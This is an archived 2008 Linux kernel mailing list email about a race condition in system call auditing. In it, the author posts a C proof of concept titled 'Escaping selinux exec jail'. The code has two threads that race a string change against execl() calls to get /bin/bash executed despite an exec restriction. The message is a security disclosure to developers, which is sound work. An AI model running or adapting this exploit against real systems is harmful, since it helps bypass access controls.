Return-Path: <linux-kernel-owner+w=401wt.eu-S1759529AbYEMMva@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1759529AbYEMMva (ORCPT <rfc822;w@1wt.eu>);
	Tue, 13 May 2008 08:51:30 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1755334AbYEMMvW
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Tue, 13 May 2008 08:51:22 -0400
Received: from tomts16.bellnexxia.net ([209.226.175.4]:62884 "EHLO
	tomts16-srv.bellnexxia.net" rhost-flags-OK-OK-OK-OK)
	by vger.kernel.org with ESMTP id S1754929AbYEMMvW (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Tue, 13 May 2008 08:51:22 -0400
X-IronPort-Anti-Spam-Filtered: true
X-IronPort-Anti-Spam-Result: AtMEAJIrKUhMROPA/2dsb2JhbACBU6sn
Date: Tue, 13 May 2008 08:51:20 -0400
From: Mathieu Desnoyers <mathieu.desnoyers@polymtl.ca>
To: David Woodhouse <dwmw2@infradead.org>
Cc: linux-kernel@vger.kernel.org, mingo@redhat.com
Subject: Re: System call audit
Message-ID: <20080513125120.GB29334@Krystal>
References: <20080513000617.GA26009@Krystal> <1210670669.3582.219.camel@pmac.infradead.org>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Content-Disposition: inline
In-Reply-To: <1210670669.3582.219.camel@pmac.infradead.org>
X-Editor: vi
X-Info: http://krystal.dyndns.org:8080
X-Operating-System: Linux/2.6.21.3-grsec (i686)
X-Uptime: 08:46:26 up 74 days,  8:57,  3 users,  load average: 0.72, 0.76,
	0.73
User-Agent: Mutt/1.5.16 (2007-06-11)
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

* David Woodhouse (dwmw2@infradead.org) wrote:
> On Mon, 2008-05-12 at 20:06 -0400, Mathieu Desnoyers wrote:
> > Hi David,
> > 
> > As I am looking into the system-wide system call tracing problem, I
> > start to wonder how auditsc deals with the fact that user-space could
> > concurrently change the content referred to by the __user pointers.
> 
> In general we have to copy the content into kernel space, audit it, and
> then act on it from there. See the explanation on the IPC audit patch at
> http://lwn.net/Articles/125350/ for example.
> 
> Auditing one thing and then acting on another would be simply broken.
> 
> > This would be the case for execve. If we create a program with two
> > thread; one is executing execve syscalls and the other thread would be
> > modifying the userspace string containing the name of the program to
> > execute.
> 
> I was going to suggest that that attack vector won't work, because
> execve() kills all threads. But all you have to do to avoid that is put
> the data in question into a shared writable mmap and modify it from
> another _process_. And in fact I suspect there's a combination of CLONE_
> flags which would avoid the thread-killing behaviour anyway.
> 

Even better : if execve fails, it doesn't kill the threads. Therefore,
all we have to do is to busy-loop doing failing execve() calls and
atomically change the string to what we want to be executed. Can anyone
test the sample snippet in a context where executing /bin/bash is
disallowed on a SMP system ? I don't have a selinux setup handy. I
suppose that as soon as selinux would see one /bin/bash exec, it will
kill the process, so a few runs would be required in order to generate
the correct race.


/*
 * Escaping selinux exec jail
 *
 * build with gcc -lpthread -o escape-selinux escape-selinux.c
 *
 * Mathieu Desnoyers
 * License: GPL
 */

#include <stdio.h>
#include <pthread.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdio.h>
#include <signal.h>

static char modstring[] = "$bin/bash";

void *thr1(void *arg)
{
	while(1) {
		execl(modstring, NULL);
	}
	return ((void*)1);

}

void *thr2(void *arg)
{
	while(1) { 
		modstring[0] = '$';
		modstring[0] = '/';
	}
	return ((void*)2);
}

int main()
{
	int err;
	pthread_t tid1, tid2;
	void *tret;

	err = pthread_create(&tid1, NULL, thr1, NULL);
	if (err != 0)
		exit(1);

	err = pthread_create(&tid2, NULL, thr2, NULL);
	if (err != 0)
		exit(1);

	sleep(10);

	err = pthread_join(tid1, &tret);
	if (err != 0)
		exit(1);

	err = pthread_join(tid2, &tret);
	if (err != 0)
		exit(1);

	return 0;
}


> >  Since we have two copy_from_user, one in auditsc and one in the
> > real execve() function, the string passed to the OS could differ from
> > the string seen by auditsc.
> 
> Right. Don't Do That Then. The audit code should see what's _actually_
> given to the child process. The audit/execve code has changed since I
> last looked, but I think it's probably OK because it's reading the
> contents of the new program's mm on the way back from the execve()
> system call -- before ever giving the CPU back to that process.
> 
> -- 
> dwmw2
> 

-- 
Mathieu Desnoyers
OpenPGP key fingerprint: 8CD5 52C3 8E3C 4140 715F  BA06 3F25 A8FE 3BAE 9A68
